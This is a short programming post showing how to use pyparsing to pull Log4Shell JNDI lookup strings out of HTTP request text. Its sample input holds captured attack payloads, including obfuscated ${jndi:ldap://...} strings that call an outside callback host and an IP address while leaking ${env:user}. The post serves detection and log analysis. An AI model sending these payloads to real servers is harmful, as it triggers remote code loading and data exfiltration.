# extract log4shell payload 
Question: How do I extract jndp payload like 
```python
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//test-smsapi-smp.tencent.com.ga.c6t8twb2vtc0000jrfv0gdprpqryyyyyb.interactsh.com:80/${env:user}}
```
regex is cool but complex. let's use pyparsing! (You'll need to install pyparsing `pip install pyparsing` first)

```python
from pyparsing import *

value = """
POST /include?q=$%7Bjndi:ldap://xx:1389/ysgb0t%7D HTTP/1.1
Host: xxx.xxx.xxx:80
Transfer-Encoding: identity
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: ${jndi:ldap://78.31.71.248:1389/ysgb0t}
Cookie: acw_tc=xxx
User-Agent: ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//test-smsapi-smp.tencent.com.ga.c6t8twb2vtc0000jrfv0gdprpqryyyyyb.interactsh.com:80/${env:user}}

args1=${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//test-smsapi-smp.tencent.com.ga.c6t8twb2vtc0000jrfv0gdprpqryyyyyb.interactsh.com:80/${env:user}}&args2=${jndi:ldap://xx:1389/ysgb0t}
"""

expr = Combine(nestedExpr('${', '}'))
single_value = QuotedString(quoteChar="${", endQuoteChar="}")


def extract_payloads(long_text):
    for tokens, start, end in expr.scanString(long_text):
        print(long_text[start:end])


if __name__ == '__main__':
    extract_payloads(value)
```

Hope it save your time.
